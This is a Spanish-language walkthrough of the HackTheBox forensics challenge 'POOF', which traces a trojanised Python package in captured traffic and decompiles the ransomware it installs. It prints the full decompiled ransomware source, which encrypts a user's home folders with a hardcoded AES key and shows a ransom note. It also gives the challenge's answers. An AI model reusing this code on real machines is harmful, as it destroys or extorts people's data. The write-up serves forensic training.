---
title: POOF
description: >
  HackTheBox Forensics Challenge - Easy<br>
  [Challenge Download](https://app.hackthebox.com/challenges/439)
date: 2024-05-08
weight: 10
tags: ["htb","forensics","easy", "wireshark", "deobfuscation", "python-pyc", "crypto"]
---

---
# Enunciado del problema

In my company, we are developing a new python game for Halloween. I'm the leader of this project; thus, I want it to be unique. So I researched the most cutting-edge python libraries for game development until I stumbled upon a private game-dev discord server. One member suggested I try a new python library that provides enhanced game development capabilities. I was excited about it until I tried it. Quite simply, all my files are encrypted now. Thankfully I manage to capture the memory and the network traffic of my Linux server during the incident. Can you analyze it and help me recover my files? To get the flag, connect to the docker service and answer the questions.

---
# Resolución

Hablan de juegos y en la captura de paquetes nos encontramos en objetos el siguiente archivo:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240510152839.png)

Dentro de este archivo nos encontramos:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240510153150.png)

### Which is the malicious URL that the ransomware was downloaded from? (for example: http://maliciousdomain/example/file.extension)

Usando wireshark buscamos por peticiones y obtenemos el host como el directorio entero:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240510181004.png)

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240510181116.png)

Correct answer: ```
```http
http://files.pypi-install.com/packages/a5/61/caf3af6d893b5cb8eae9a90a3054f370a92130863450e3299d742c7a65329d94/pygaming-dev-13.37.tar.gz
```

### What is the name of the malicious process? (for example: malicious)

Al descomprimir el archivo de wireshark, que ya hemos comentado antes, tendremos el archivo: *configure*. que es el proceso malicioso

Correct answer:
```python
configure
```

### Provide the md5sum of the ransomware file.

Simplemente hacer un md5sum al archivo *configure*.

Correct answer:
```bash
$> md5sum configure

c010fb1fdf8315bc442c334886804e00  configure
```

### Which programming language was used to develop the ransomware? (for example: nim)

Sin más se llama *pygame*, si quieres verificar hay un modulo en *PYPI* llamado exactamente igual: https://pypi.org/project/pygame/, otra manera de verificarlo:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240510181620.png)

Correct answer:
```python
python
```

### After decompiling the ransomware, what is the name of the function used for encryption? (for example: encryption)

Una busqueda de google y ya tenemos la mitad de la pregunta:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240510181911.png)

Windows tiene sus ventajas, como hacer un click y ya tener el archivo... Obteniendo la herramienta de github: https://github.com/pyinstxtractor/pyinstxtractor-ng/releases e usandola en nuestro powershell nos saldra este output:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240510182147.png)

Donde se nos creara un directorio llamado: `configure_extracted`, y como bien nos dice *pyinstxtractor-ng* tendremos el código en el archivo: *configure.pyc*, como somos curiosos y no sabemos cual es esa extesión le preguntamos a google:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240510182457.png)

Buscando en stackoverflow, nos encontraremos con este comentario:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240510182547.png)

Sabiendo que podemos usar [*uncompyle6*](https://github.com/rocky/python-uncompyle6) lo instalamos y al usarlo:

```python
# uncompyle6 version 3.8.0
# Python bytecode 3.6 (3379)
# Decompiled from: Python 2.7.18 (default, Apr 21 2020, 09:53:40)
# [GCC 8.3.0]
# Warning: this version of Python has problems handling the Python 3 byte type in constants properly.

# Embedded file name: configure.py
from Crypto.Cipher import AES
import random, string, time, os

def Pkrr1fe0qmDD9nKx(filename: str, data: bytes) -> None:
    open(filename, 'wb').write(data)
    os.rename(filename, f"{filename}.boo")


def mv18jiVh6TJI9lzY(filename: str) -> None:
    data = open(filename, 'rb').read()
    key = 'vN0nb7ZshjAWiCzv'
    iv = b'ffTC776Wt59Qawe1'
    cipher = AES.new(key.encode('utf-8'), AES.MODE_CFB, iv)
    ct = cipher.encrypt(data)
    Pkrr1fe0qmDD9nKx(filename, ct)


def w7oVNKAyN8dlWJk() -> str:
    letters = string.ascii_lowercase + string.digits
    _id = ''.join(random.choice(letters) for i in range(32))
    return _id


def print_note() -> None:
    _id = w7oVNKAyN8dlWJk()
    banner = f"\n\nPippity poppity give me your property!\n\n\t   *                  ((((\n*            *        *  (((\n\t   *                (((      *\n  *   / \\        *     *(((    \n   __/___\\__  *          (((\n\t (O)  |         *     ((((\n*  '<   ? |__ ... .. .             *\n\t \\@      \\    *    ... . . . *\n\t //__     \t// ||\\__   \\    |~~~~~~ . . .   *\n====M===M===| |=====|~~~~~~   . . .. .. .\n\t\t *  \\ \\ \\   |~~~~~~    *\n  *         <__|_|   ~~~~~~ .   .     ... .\n\t\nPOOF!\n\nDon't you speak English? Use https://translate.google.com/?sl=en&tl=es&op=translate \n\nYOU GOT TRICKED! Your home folder has been encrypted due to blind trust.\nTo decrypt your files, you need the private key that only we possess. \n\nYour ID: {_id}\n\nDon't waste our time and pay the ransom; otherwise, you will lose your precious files forever.\n\nWe accept crypto or candy.\n\nDon't hesitate to get in touch with cutie_pumpkin@ransomwaregroup.com during business hours.\n\n\t"    
    print(banner)
    time.sleep(60)


def yGN9pu2XkPTWyeBK(directory: str) -> list:
    filenames = []
    for filename in os.listdir(directory):
        result = os.path.join(directory, filename)
        if os.path.isfile(result):
            filenames.append(result)
        else:
            filenames.extend(yGN9pu2XkPTWyeBK(result))

    return filenames


def main() -> None:
    username = os.getlogin()
    directories = [
     f"/home/{username}/Downloads",
     f"/home/{username}/Documents",
     f"/home/{username}/Desktop"]
    for directory in directories:
        if os.path.exists(directory):
            files = yGN9pu2XkPTWyeBK(directory)
            for fil in files:
                try:
                    mv18jiVh6TJI9lzY(fil)
                except Exception as e:
                    pass

    print_note()


if __name__ == '__main__':
    main()
# okay decompiling configure_extracted/configure.pyc
```

Nos mostrara este código de python donde podemos sacar el nombre de la función, y leyendo como funciona sabemos que esta encriptando los archivos.

```python
def mv18jiVh6TJI9lzY(filename: str) -> None:
    data = open(filename, 'rb').read()
    key = 'vN0nb7ZshjAWiCzv'
    iv = b'ffTC776Wt59Qawe1'
    cipher = AES.new(key.encode('utf-8'), AES.MODE_CFB, iv)
    ct = cipher.encrypt(data)
    Pkrr1fe0qmDD9nKx(filename, ct)
```

Correct answer:

```cleartext
mv18jiVh6TJI9lzY
```

### Decrypt the given file, and provide its md5sum.

Simple script de python:

```python
from Crypto.Cipher import AES
from hashlib import md5

data = open('candy_dungeon.pdf.boo', 'rb').read()  
key = b'vN0nb7ZshjAWiCzv'
iv = b'ffTC776Wt59Qawe1'

cipher = AES.new(key, AES.MODE_CFB, iv)
md5(cipher.decrypt(data)).hexdigest()
```

Correct answer:

```cleartext
3bc9f072f5a7ed4620f57e6aa8d7e1a1
```

---

Espero que hayas aprendido nuevos conceptos

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240510183503.png)